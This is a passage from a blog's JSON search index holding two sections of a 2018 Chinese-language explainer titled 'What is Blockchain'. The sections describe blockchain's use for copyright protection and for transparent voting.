","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:12:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.6 版权保护 版权保护在中国一直是大家十分关注且亟待解决的问题。但是版权登记成本较高、效率低，以及版权保护的效率低、效果差的问题一直存在。将区块链技术应用到版权保护领域，对版权所有者和其版权产出的数据进行存储，可以实现对所有权的溯源，从而达到保护版权的目的。 更高效、便捷、有效的保障内容生产者权益的方式，能激励更多的创作者继续创造新的内容，创作者通过将作品记录于区块链，实现对原创作品的追踪，一旦发生纠纷或者盗用事件，可以尽快展开进一步的措施。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:13:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"},{"categories":["基础知识"],"content":"7.7 投票 在部分国家，投票被用于进行总统选举。投票本着公平公正、少数服从多数的原则，但是由于系统透明度低，投票结果容易引起部分参与者的怀疑。区块链去中心化和透明化的特点正好可以有针对性地解决这个问题，使投票透明、真实性强。 ","date":"2018-03-02","objectID":"/blog/20180302/what-is-blockchain.html/:14:0","tags":["基础知识","区块链"],"title":"什么是区块链(Blockchain)?","uri":"/blog/20180302/what-is-blockchain.html/"}]